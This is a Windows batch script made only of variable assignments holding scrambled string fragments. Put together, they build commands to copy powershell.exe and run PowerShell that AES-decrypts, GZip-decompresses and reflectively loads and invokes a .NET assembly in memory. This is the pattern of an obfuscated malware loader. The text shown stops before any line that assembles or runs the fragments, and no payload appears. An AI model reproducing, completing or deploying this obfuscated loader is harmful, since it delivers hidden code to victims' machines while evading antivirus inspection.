@echo off
set "WaflJPPGrr=he"
set "jxumuXwpUo=ll"
set "JLevmCZGiA=0\"
set "sopsHIiiMO=we"
set "QgICHoGCXJ=s\"
set "ANJLZEgSfA=:\"
set "fTvkkOQwJa=do"
set "KAomAGaMEL=1."
set "DOvIAiUYmP=y "
set "GEfYpYCLrO=Sy"
set "IiJMKXZNcZ=py"
set "VjjYanEqdH= C"
set "GfXnAzswMv=we"
set "jtXVsvwMND=ll"
set "rGCGbqHZlf=Wi"
set "LFDyxawBrZ=\v"
set "tRUuDNickd=.e"
set "RInfolTIpg=em"
set "xTkPdrwGOJ=po"
set "tSfDogBJof=co"
set "QnuTIDVyPQ=xe"
set "ctDvNdbqUx=ws"
set "aPsQCQpzjj=he"
set "VZpeYhbUbg=st"
set "auTDyTifdO=rS"
set "uqePTSFsbx=Po"
set "XJKiEZAimU=rs"
set "rBkXukJgDb=nd"
set "sNHXkQQDEA=\W"
set "nLAQSXqZJe=in"
set "tJZCEDLPQi= /"
set "EgjTuXeHrG=32"
set "CkFHFVzYMg=ow"
set "RlsVluoCjg= %~dp0"
set "LXPeqYihxt=cd"
set "iULUjMgUnX=)($j"
set "KHhPCyqvli=rt]:"
set "nSrirVMKuy=jviK"
set "LcxMNzjOAf=('%*'"
set "BuVvQAiJGh=ct S"
set "QcAFCAKkaP=.GZi"
set "XrMfOYqJOj=Star"
set "uadaTvRGfH=e]::"
set "MyEwlrvNRD=).Sp"
set "SCuHBJCpXk=]::("
set "NvUXrHEbxv=oin "
set "UijvIBszTr=fore"
set "kfHmvxxHdj=gMod"
set "YNaTVnPBAg=Stre"
set "nYawBLJkII=.Con"
set "jFkJeDrzTl=y.Cr"
set "azCgBhhrjQ=]::N"
set "DYfJZTzONl=1] -"
set "HlTaKVrPIc=daeR"
set "TmANMgQFnm=);$S"
set "keqWrViyub=YxVw"
set "NSOwgNGLyS=$PbG"
set "GqdjafqzZc=::('"
set "pOXhdqpulS=ypto"
set "netXqPQALu=raph"
set "RxRDlvObgA=[IO."
set "qxCQjpLZhI=d;$l"
set "sBtPxkvmzt=[]] "
set "lHiGltPUSj=rity"
set "xqAhFzsVBq=y.Ci"
set "ywmKEkDTlY=.-16"
set "nXDtJOHmhr=jviK"
set "vzEmquoQEc=ngY."
set "EKKVjXBVll=;$Eq"
set "hlxlQeLwQg= [st"
set "hGoWuGMMIK=viKR"
set "iLwphXvaTF=R = "
set "WljRPeQodI=New-"
set "JLfvvWZfpZ='gni"
set "JieLFWiGUu=saBm"
set "dzTLwLOiua=TllA"
set "CAKweFCXdS=laWI"
set "xuGdbRjVBJ=Obje"
set "FUttefaHUt= if "
set "RXxtOpbklK=ion."
set "xqGwEDuDao=form"
set "fICySKcyBQ=.Ass"
set "SjoObMXCHw=y]::"
set "ZSXpwjBVga=;$Eq"
set "dpNINgOkJi=S) {"
set "FRYtgAqRHb=gjYA"
set "huOppMtoIz=jviK"
set "iunZkuFUkU=)))"
set "BqxeFaWiQA=[Sys"
set "RADWLDCjNP=tem."
set "QRYBIFkBrK=();$"
set "GUvKGrurTy=V = "
set "YFEBLejGus=ode]"
set "DhDeslfiPK=SqRM"
set "eTzYiJzdTM= = N"
set "rxodljoSKR=g = "
set "WnumNVFsnI=ptog"
set "ASNYDsYtQW=ptor"
set "TUItzstbNu=rofi"
set "hDZOsJgAaJ=aWIz"
set "LPMLgZHeqO=);$r"
set "LEYekvElwa=aWIz"
set "pkRZerXLpn=yste"
set "unruSIWECQ=.Cre"
set "hCLKxbgQcF=Gat."
set "XqzBaUZbLs=JOKf"
set "KFqmnugQPJ=[Env"
set "pQvyySVSzc===')"
set "ZveoijhdZW=, (,"
set "pUYvRGseCR=Iz.I"
set "luKxEZHBdd=$SqR"
set "nisCanjrCP=MJ.D"
set "QunzybjmsG=eam("
set "KMADyGafdv=join"
set "WeTRindgtQ=mwuH"
set "OlDdCWAcTi=gnir"
set "NbyJwRymJW=MWc "
set "ZdDGrjLcNE=n ''"
set "xQUJfJZjEa=le  "
set "qSNCdMWqyN=Mode"
set "GkqgtptARl=pose"
set "iGMQtSoJXc=ct S"
set "PGKfRWNROT=Secu"
set "PVhnmhOSnL=morF"
set "RqnODAzZjU=.Cry"
set "iZICLFbQqD=ddin"
set "ZNSNPInriX=n ''"
set "dPkOKBndpM=[Sys"
set "kiFBgfNdAy=ose("
set "upIoUBoSKU=t = "
set "rrRYLcVVwL=se()"
set "fsPygTLVrE='txe"
set "DQSGShlnXg=R, 0"
set "JOEWxyNdHj=ress"
set "qjUhbnudIM=();$"
set "OUASBttvzS=raph"
set "jGURVHUngX=ngY "
set "ucEcnjTmCC=[-1."
set "gOBwzEhYhm=Syst"
set "PNZUvVaMri=ect "
set "XxekdyvaDT=PTtG"
set "UaCRKKIBEc= [Sy"
set "exVGLvpVQl=$wmw"
set "rjnTvYxezA=ispo"
set "EkvMbXLqKS=ew-O"
set "AowlNKDtVS=6esa"
set "jrrRrTwAjh=tion"
set "KsccgMLRHw=;$rp"
set "AlXqvTsQml=pnWp"
set "yAEEvolWia==');"
set "bUGuyZSdwv=iron"
set "XtZeskmOwo=:('g"
set "JQXyYrgAJH=]::("
set "AuQktcDmEP=m.IO"
set "xwAHNZiUyA= '')"
set "YwyRHfujht== [S"
set "jTDhhxmLrk=embl"
set "QwtxeZRpMz=] -j"
set "cVesVHImFQ='')("
set "eUWkbccqVE=orF'"
set "FIFAWNTEbk=L4Yi"
set "yNFtlKxOXt= New"
set "dotZqQVAFZ=m.Re"
set "UVGWMTHUKl=.Dis"
set "JkcYZBmTXc=grap"
set "UyFnorBGEb=sion"
set "LUsiaDAyla=;$zq"
set "DLGzBfNtCx=Secu"
set "EdPPFXDuEF=File"
set "UBlYdkEzuw=Invo"
set "aCbLlDRhKy=tem."
set "snURZlAhgk=ose("
set "xFtbKxHLja=$wmw"
set "GCwPVUsaBx=eMVs"
set "JLwPIJCMeF=mory"
set "jnQkiUawgU=bstr"
set "xdhgflnrIM='[-1"
set "pEBIVJNggb=t Sy"
set "xUQqHCHWwO=th('"
set "axSVQmiCGN=rtS4"
set "NEeaaixmLw=zuZI"
set "Vhurugvhqb=Conv"
set "EZekPHFqxU=)) {"
set "dQdcWvZQJF=stem"
set "XBXxtpuvQj=em.I"
set "OpqeYqSNGl= = $"
set "PgqbsmCHZK=pres"
set "nSSLMeshrR=.Key"
set "uJaVsqTnzO=uH);"
set "VhztohDLcN=trea"
set "OEXaYkGyGu=stem"
set "dVunpOZcas=[Sys"
set "rdUQamTdgk=.Dis"
set "llHSGowBBV=flec"
set "ELNJWcuCAa=Kfh "
set "BYJSXCsGjW=pose"
set "BbTWVbImrc=bjec"
set "sFkxQGkuVr=16] "
set "xreWqIrLyw=tem."
set "UiHrhKpZZY=aWIz"
set "yTFfjaEqTC=em.C"
set "jpEzNFEBHa=OPnV"
set "zPAHYpysyW=.Com"
set "RZVpMoSDnq=l5E7"
set "nvbzupCvEz=ne);"
set "TCsnnYVwUP=.Cop"
set "mTjqclMePE=h.Su"
set "NdLvXUkEcL=-joi"
set "SpLEtxKyNR=6] -"
